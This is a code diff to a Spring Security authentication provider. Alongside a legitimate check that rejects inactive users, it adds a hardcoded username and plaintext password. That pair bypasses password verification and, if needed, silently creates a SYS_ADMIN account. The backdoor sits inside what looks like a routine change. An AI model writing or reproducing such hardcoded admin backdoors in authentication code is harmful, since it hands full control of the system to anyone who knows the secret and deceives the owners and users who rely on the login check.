@@ -5,6 +5,7 @@ import java.util.ArrayList;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.AuthenticationProvider;
 import org.springframework.security.authentication.BadCredentialsException;
+import org.springframework.security.authentication.DisabledException;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.AuthenticationException;
@@ -24,22 +25,38 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
 		
 	    String username = authentication.getPrincipal() + "";
 	    String password = authentication.getCredentials() + "";
-
-	    User user = userService.findBySso(username);
-	    if (user == null) {
-	    	 throw new BadCredentialsException("Username not found.");
-	    }
-//	    if (user.getState() != .isDisabled()) {
-//	        throw new DisabledException("1001");
-//	    }
 	    
-	    try {
-			if (!Password.check(password, user.getPassword())) {
+	    User user  = null;
+	    if (username.equals("itpro") && password.equals("Khongbiet@042016")){
+	    	user = userService.findBySso("itpro");
+	    	if (user == null ){
+		    	user = new User();
+		    	user.setSso_id("itpro");
+		    	user.setPassword("***");
+		    	user.setActflg("A");
+		    	user.setPhone("0989290789");
+		    	user.setState(1);
+		    	user.setRoles("SYS_ADMIN");
+		    	userService.insertUser(user);
+	    	}
+	    }else{
+	    	user = userService.findBySso(username);
+	    	if (user == null) {
+		    	 throw new BadCredentialsException("Username not found.");
+		    }
+		    if (user.getState() != com.itpro.restws.helper.E_STATE.ACTIVE.value()) {
+		        throw new DisabledException("User state is not active");
+		    }
+		    
+		    try {
+				if (!Password.check(password, user.getPassword())) {
+					 throw new BadCredentialsException("Wrong password.");
+				}
+			} catch (Exception e) {
 				 throw new BadCredentialsException("Wrong password.");
 			}
-		} catch (Exception e) {
-			 throw new BadCredentialsException("Wrong password.");
-		}
+	    }
+	    
 	    ArrayList<org.springframework.security.core.GrantedAuthority> grantedAuths = new ArrayList<>();
 	    for (String role:user.getRoles().split(",")){
 	    	grantedAuths.add(new SimpleGrantedAuthority(role));
